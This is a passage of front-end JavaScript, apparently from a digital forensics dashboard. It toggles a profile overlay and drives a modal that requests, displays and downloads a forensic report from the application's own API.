    const profileBtn = document.getElementById("profile-badge-btn");
    const overlayCard = document.getElementById("profile-overlay-card");

    if (!profileBtn || !overlayCard) return;

    profileBtn.addEventListener("click", (event) => {
        event.stopPropagation();
        overlayCard.style.display = overlayCard.style.display === "block" ? "none" : "block";
    });

    document.addEventListener("click", (event) => {
        if (!overlayCard.contains(event.target) && event.target !== profileBtn) {
            overlayCard.style.display = "none";
        }
    });
}

// 18. Dynamic Forensic Report Generator Controller
async function triggerReportGeneration(fileName) {
    const modal = document.getElementById("report-viewer-modal");
    const content = document.getElementById("report-modal-content");
    const closeBtn = document.getElementById("report-modal-close");
    const downloadBtn = document.getElementById("report-modal-download");
    
    if (!modal || !content) return;
    
    // Clear and display loading state
    content.innerText = `[+] Initializing Roblocksec automated forensics pipeline...
[+] Querying stateful SQLite custody log profiles...
[+] Running integrity validation checks on target file signature: [${fileName}]
[+] Generating official DFIR assessment summary report... Please hold.`;
    modal.style.display = "flex";
    
    let generatedReportText = "";
    
    try {
        const response = await fetch(`/api/v1/evidence/${encodeURIComponent(fileName)}/report`, {
            method: "POST"
        });
        
        if (response.ok) {
            const data = await response.json();
            if (data.status === "SUCCESS") {
                generatedReportText = data.report;
                content.innerText = generatedReportText;
                
                // Track generation in workspace audit logs
                addAuditLine("AGENT_SMITH", "REPORT_GEN", `Generated forensic compliance report for evidence file: ${fileName}`);
            } else {
                content.innerText = `[X] Error: Failed to compile forensic report metrics.\nDetails: ${data.message || 'Unknown response anomaly.'}`;
            }
        } else {
            content.innerText = `[X] API Exception: Server returned status code ${response.status}.`;
        }
    } catch (e) {
        console.error("Report generation failure:", e);
        content.innerText = `[X] Connection Error: Failed to dispatch request to forensic reporting subsystem.\n${e.message}`;
    }
    
    // Setup modal listeners
    const closeModal = () => {
        modal.style.display = "none";
    };
    
    closeBtn.onclick = closeModal;
    
    // Clicking outside modal body closes it
    modal.onclick = (e) => {
        if (e.target === modal) {
            closeModal();
        }
    };
    
    // Download action
    downloadBtn.onclick = () => {
        if (!generatedReportText) return;
        const blob = new Blob([generatedReportText], { type: "text/markdown" });
        const url = URL.createObjectURL(blob);
        const a = document.createElement("a");
        a.href = url;
        a.download = `${fileName.replace(/\s+/g, "_")}_forensic_report.md`;
        document.body.appendChild(a);
        a.click();
        document.body.removeChild(a);
        URL.revokeObjectURL(url);
    };
}
